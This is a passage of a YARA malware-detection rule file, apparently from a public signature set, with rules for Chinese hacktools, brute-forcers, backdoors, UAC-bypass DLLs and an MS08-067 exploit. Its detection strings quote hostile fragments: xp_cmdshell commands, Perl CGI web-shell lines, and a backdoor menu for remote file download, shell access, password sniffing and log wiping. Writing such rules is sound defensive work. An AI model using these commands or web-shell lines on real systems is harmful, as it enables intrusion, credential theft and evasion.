		$s1 = "Cmder Launcher" fullword wide
		$s4 = "CMDER_ROOT" fullword wide
	condition:
		all of them
}

rule BypassUac_3 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.dll"
		author = "Yara Bulk Rule Generator"
		hash = "1974aacd0ed987119999735cad8413031115ce35"
	strings:
		$s0 = "BypassUacDLL.dll" fullword wide
		$s1 = "\\Release\\BypassUacDll" ascii
		$s3 = "Win7ElevateDLL" fullword wide
		$s7 = "BypassUacDLL" fullword wide
	condition:
		3 of them
}

rule APT_Proxy_Malware_Packed_dev
{
	meta:
		author = "FRoth"
		date = "2014-11-10"
		description = "APT Malware - Proxy"
		hash = "6b6a86ceeab64a6cb273debfa82aec58"
		score = 50
	strings:
		$string0 = "PECompact2" fullword
		$string1 = "[LordPE]"
		$string2 = "steam_ker.dll"
	condition:
		all of them
}

rule Ncat_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file nc.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "001c0c01c96fa56216159f83f6f298755366e528"
	strings:
		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
		$s3 = "gethostpoop fuxored" fullword ascii
		$s6 = "VERNOTSUPPORTED" fullword ascii
		$s7 = "%s [%s] %d (%s)" fullword ascii
		$s12 = " `--%s' doesn't allow an argument" fullword ascii
	condition:
		all of them
}
rule MS08_067_Exploit_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file cs.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
	strings:
		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
		$s3 = "Make SMB Connection error:%d" fullword ascii
		$s5 = "Send Payload Over!" fullword ascii
		$s7 = "Maybe Patched!" fullword ascii
		$s8 = "RpcExceptionCode() = %u" fullword ascii
		$s11 = "ph4nt0m" fullword wide
		$s12 = "\\\\%s\\IPC$" fullword ascii
	condition:
		4 of them
}
rule Hacktools_CN_Burst_sql {
	meta:
		description = "Disclosed hacktool set - file sql.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
	strings:
		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
		$s2 = "s.exe start error...%d" fullword ascii
		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
		$s10 = "Result.txt" fullword ascii
		$s11 = "Usage:sql.exe [options]" fullword ascii
		$s17 = "%s root %s %d error" fullword ascii
		$s18 = "Pass.txt" fullword ascii
		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
	condition:
		6 of them
}

rule Hacktools_CN_WinEggDrop {
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
	strings:
		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
		$s8 = "Something Wrong About The Ports" fullword ascii
		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_JoHor_Posts_Killer {
	meta:
		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
	strings:
		$s0 = "Multithreading Posts_Send Killer" fullword ascii
		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
		$s6 = "The program's need files was not exist!" fullword ascii
		$s7 = "JoHor_Posts_Killer" fullword wide
		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
		$s10 = "  ( /s ) :" fullword ascii
		$s11 = "forms.vbp" fullword ascii
		$s12 = "forms.vcp" fullword ascii
		$s13 = "Software\\FlySky\\E\\Install" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tesksd {
	meta:
		description = "Disclosed hacktool set - file tesksd.jpg"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
	strings:
		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
		$s1 = "ExeMiniDownload.exe" fullword wide
		$s16 = "POST %Hs" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Http {
	meta:
		description = "Disclosed hacktool set - file Http.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
	strings:
		$s0 = "RPCRT4.DLL" fullword ascii
		$s1 = "WNetAddConnection2A" fullword ascii
		$s2 = "NdrPointerBufferSize" fullword ascii
		$s3 = "_controlfp" fullword ascii
	condition:
		all of them and filesize < 10KB
}

rule Hacktools_CN_Panda_tasksvr {
	meta:
		description = "Disclosed hacktool set - file tasksvr.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
	strings:
		$s2 = "Consys21.dll" fullword ascii
		$s4 = "360EntCall.exe" fullword wide
		$s15 = "Beijing1" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_WinEggDrop_Generic {
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "966a60028a3a24268c049ffadbe1a07b83de24ce"
	strings:
		$s19 = "TCP Port Scanner" fullword ascii
		$s20 = "By WinEggDrop" fullword ascii
	condition:
		all of them
}

rule VUBrute_VUBrute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii
	condition:
		all of them
}

rule DK_Brute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii
	condition:
		all of them
}

rule VUBrute_config {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii
	condition:
		all of them
}

rule UltraVNCViewerPortable {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file UltraVNCViewerPortable.exe - may be used by attackers"
		author = "Florian Roth"
		date = "22.11.14"
		score = 35
		reference = "http://goo.gl/xiIphp"
		hash = "8d5e16c478b12b4336b4aef96709469063d8de12"
	strings:
		$s4 = "Server should be of the form host:display." fullword wide
		$s8 = "( host:display or host::port )" fullword wide
		$s9 = "Send 'Start' (Ctrl+Esc) to host" fullword wide
		$s10 = "Failed to register .vnc extension" fullword ascii
		$s11 = "Host: %s  Port: %d" fullword ascii
		$s20 = ".Set the options to be used for new connections" fullword wide
	condition:
		all of them
}


rule sig_238_hunt {
	meta:
		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
	strings:
		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
		$s3 = "Usage - hunt \\\\servername" fullword ascii
		$s4 = ".share = %S - %S" fullword wide
		$s5 = "SMB share enumerator and admin finder " fullword ascii
		$s7 = "Hunt only runs on Windows NT..." fullword ascii
		$s8 = "User = %S" fullword ascii
		$s9 = "Admin is %s\\%s" fullword ascii
	condition:
		all of them
}

rule sig_238_listip {
	meta:
		description = "Disclosed hacktool set (old stuff) - file listip.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
	strings:
		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
		$s4 = "Local Host Name: %s" fullword ascii
		$s5 = "Packed by exe32pack 1.38" fullword ascii
		$s7 = "Local Computer Name: %s" fullword ascii
		$s8 = "Local IP Adress: %s" fullword ascii
	condition:
		all of them
}

rule ArtTrayHookDll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
	strings:
		$s0 = "ArtTrayHookDll.dll" fullword ascii
		$s7 = "?TerminateHook@@YAXXZ" fullword ascii
	condition:
		all of them
}

rule sig_238_eee {
	meta:
		description = "Disclosed hacktool set (old stuff) - file eee.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
	strings:
		$s0 = "szj1230@yesky.com" fullword wide
		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
		$s4 = "MailTo:szj1230@yesky.com" fullword wide
		$s5 = "Command1_Click" fullword ascii
		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
		$s11 = "vb5chs.dll" fullword ascii
		$s12 = "MSVBVM50.DLL" fullword ascii
	condition:
		all of them
}

rule EditServer {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
	strings:
		$s0 = "%s Server.exe" fullword ascii
		$s1 = "Service Port: %s" fullword ascii
		$s2 = "The Port Must Been >0 & <65535" fullword ascii
		$s8 = "3--Set Server Port" fullword ascii
		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
		$s13 = "Service Name: %s" fullword ascii
		$s14 = "Server Password: %s" fullword ascii
		$s17 = "Inject Process Name: %s" fullword ascii

		$x1 = "WinEggDrop Shell Congirator" fullword ascii
	condition:
		5 of ($s*) or $x1
}

rule sig_238_letmein {
	meta:
		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
	strings:
		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
		$s6 = "Error get users from server!" fullword ascii
		$s7 = "get in nt by name and null" fullword ascii
		$s16 = "get something from nt, hold by killusa." fullword ascii
	condition:
		all of them
}

rule sig_238_token {
	meta:
		description = "Disclosed hacktool set (old stuff) - file token.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
	strings:
		$s0 = "Logon.exe" fullword ascii
		$s1 = "Domain And User:" fullword ascii
		$s2 = "PID=Get Addr$(): One" fullword ascii
		$s3 = "Process " fullword ascii
		$s4 = "psapi.dllK" fullword ascii
	condition:
		all of them
}

rule sig_238_TELNET {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
	strings:
		$s0 = "TELNET [host [port]]" fullword wide
		$s2 = "TELNET.EXE" fullword wide
		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
		$s14 = "Software\\Microsoft\\Telnet" fullword wide
	condition:
		all of them
}

rule snifferport {
	meta:
		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d14133b5eaced9b7039048d0767c544419473144"
	strings:
		$s0 = "iphlpapi.DLL" fullword ascii
		$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
		$s11 = "Port.TX" fullword ascii
		$s12 = "32Next" fullword ascii
		$s13 = "V1.2 B" fullword ascii
	condition:
		all of them
}

rule sig_238_webget {
	meta:
		description = "Disclosed hacktool set (old stuff) - file webget.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "GET A HTTP/1.0" fullword ascii
		$s2 = " error " fullword ascii
		$s13 = "Downloa" ascii
	condition:
		all of them
}

rule XYZCmd_zip_Folder_XYZCmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
	strings:
		$s0 = "Executes Command Remotely" fullword wide
		$s2 = "XYZCmd.exe" fullword wide
		$s6 = "No Client Software" fullword wide
		$s19 = "XYZCmd V1.0 For NT S" fullword ascii
	condition:
		all of them
}

rule sig_238_filespy {
	meta:
		description = "Disclosed hacktool set (old stuff) - file filespy.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 50
		hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
	strings:
		$s0 = "Hit [Enter] to begin command mode..." fullword ascii
		$s1 = "If you are in command mode," fullword ascii
		$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
		$s9 = "FileSpy.exe" fullword wide
		$s12 = "ERROR starting FileSpy..." fullword ascii
		$s16 = "exe\\filespy.dbg" fullword ascii
		$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
		$s19 = "Should be logging to screen..." fullword ascii
		$s20 = "Filmon:  Unknown log record type" fullword ascii
	condition:
		7 of them
}

rule ByPassFireWall_zip_Folder_Ie {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
	strings:
		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
	condition:
		all of them
}

rule sig_238_gina {
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.reg"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
	strings:
		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
		$s1 = "REGEDIT4" fullword ascii
		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
	condition:
		all of them
}

rule splitjoin {
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
	strings:
		$s0 = "Not for distribution without the authors permission" fullword wide
		$s2 = "Utility to split and rejoin files.0" fullword wide
		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
		$s19 = "SplitJoin" fullword wide
	condition:
		all of them
}

rule EditKeyLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
	strings:
		$s1 = "Press Any Ke" fullword ascii
		$s2 = "Enter 1 O" fullword ascii
		$s3 = "Bon >0 & <65535L" fullword ascii
		$s4 = "--Choose " fullword ascii
	condition:
		all of them
}

rule PassSniffer {
	meta:
		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
	strings:
		$s2 = "Sniff" fullword ascii
		$s3 = "GetLas" fullword ascii
		$s4 = "VersionExA" fullword ascii
		$s10 = " Only RuntUZ" fullword ascii
		$s12 = "emcpysetprintf\\" fullword ascii
		$s13 = "WSFtartup" fullword ascii
	condition:
		all of them
}

rule UnPack_rar_Folder_InjectT {
	meta:
		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
	strings:
		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
		$s1 = "Explorer.exe" fullword ascii
		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
		$s4 = "The Port Is Out Of Range" fullword ascii
		$s7 = "Fail To Set The Port" fullword ascii
		$s11 = "\\psapi.dll" fullword ascii
		$s20 = "TInject.Dll" fullword ascii

		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
		$x2 = "injectt.exe" fullword ascii
	condition:
		( 1 of ($x*) ) and ( 3 of ($s*) )
}

rule QQ_zip_Folder_QQ {
	meta:
		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
	strings:
		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
		$s4 = "QQ2000b.exe" fullword wide
		$s5 = "haoq@neusoft.com" fullword ascii
		$s9 = "QQ2000b.exe" fullword ascii
		$s10 = "\\qq2000b.exe" fullword ascii
		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
		$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
	condition:
		5 of them
}

rule UnPack_rar_Folder_TBack {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
		$s8 = "Shell                                 -->Get A Shell" fullword ascii
		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
		$s13 = "Online                                -->List All Connected IP" fullword ascii
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
		$s19 = "Reboot                                -->Reboot The System" fullword ascii
		$s20 = "Password Sniffering Is Not Running" fullword ascii
	condition:
		4 of them
}

rule RangeScan {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
	strings:
		$s0 = "RangeScan.EXE" fullword wide
		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
		$s9 = "Produced by isn0" fullword ascii
		$s10 = "RangeScan" fullword wide
		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
	condition:
		3 of them
}

rule ByPassFireWall_zip_Folder_Inject {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Inject.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
	strings:
		$s6 = "Fail To Inject" fullword ascii
		$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
		$s11 = " Successfully" fullword ascii
	condition:
		all of them
}

rule sig_238_sqlcmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 40
		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
	strings:
		$s0 = "Permission denial to EXEC command.:(" fullword ascii
		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
	condition:
		4 of them
}

rule ASPack_ASPACK {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide
	condition:
		all of them
}

rule sig_238_2323 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
	strings:
		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
		$s3 = "Failed to execute shell" fullword ascii
		$s5 = "/h   - Hide Window" fullword ascii
		$s7 = "Accepted connection from client at %s" fullword ascii
		$s9 = "Error %d: %s" fullword ascii
	condition:
		all of them
}

rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Install.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "95866e917f699ee74d4735300568640ea1a05afd"
	strings:
		$s1 = "http://go.163.com/sdemo" fullword wide
		$s2 = "Player.tmp" fullword ascii
		$s3 = "Player.EXE" fullword wide
		$s4 = "mailto:sdemo@263.net" fullword ascii
		$s5 = "S-Player.exe" fullword ascii
		$s9 = "http://www.BaiXue.net (" fullword wide
	condition:
		all of them
}

rule sig_238_TFTPD32 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
	condition:
		all of them
}

rule sig_238_iecv {
	meta:
		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
	strings:
		$s1 = "Edit The Content Of Cookie " fullword wide
		$s3 = "Accessories\\wordpad.exe" fullword ascii
		$s4 = "gorillanation.com" fullword ascii
		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
		$s12 = "http://nirsoft.cjb.net" fullword ascii
	condition:
		all of them
}

rule Antiy_Ports_1_21 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s7 = "AntiyPorts MFC Application" fullword wide
		$s20 = " @Stego:" fullword ascii
	condition:
		all of them
}

rule perlcmd_zip_Folder_cmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
	strings:
		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
		$s1 = "s/%20/ /ig;" fullword ascii
		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
		$s6 = "$execthis = $_;" fullword ascii
		$s7 = "system($execthis);" fullword ascii
		$s12 = "s/%2f/\\//ig;" fullword ascii
	condition:
		6 of them
}

rule sig_238_FPipe {
	meta:
		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
		$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s3 = " -s    - outbound source port number" fullword ascii
		$s5 = "http://www.foundstone.com" fullword ascii
		$s20 = "Attempting to connect to %s port %d" fullword ascii
	condition:
		all of them
}

rule sig_238_concon {
	meta:
		description = "Disclosed hacktool set (old stuff) - file concon.com"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
	strings:
		$s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
	condition:
		all of them
}

rule CleanIISLog {
	meta:
		description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
	strings:
		$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
		$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
		$s8 = "CleanIISLog Ver" fullword ascii
		$s9 = "msftpsvc" fullword ascii
		$s10 = "Fatal Error: MFC initialization failed" fullword ascii
		$s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
		$s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
		$s16 = "Service %s Stopped." fullword ascii
		$s20 = "Process Log File %s..." fullword ascii
	condition:
		5 of them
}

rule sqlcheck {
	meta:
		description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
	strings:
		$s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
		$s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
		$s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
		$s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
		$s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
	condition:
		3 of them
}

rule sig_238_RunAsEx {
	meta:
		description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
	strings:
		$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
		$s8 = "cmd.bat" fullword ascii
		$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
		$s11 = "%s Execute Succussifully." fullword ascii
		$s12 = "winsta0" fullword ascii
		$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
	condition:
		4 of them
}

rule sig_238_nbtdump {
	meta:
		description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
	strings:
		$s0 = "Creation of results file - \"%s\" failed." fullword ascii
		$s1 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "Cerberus NBTDUMP" fullword ascii
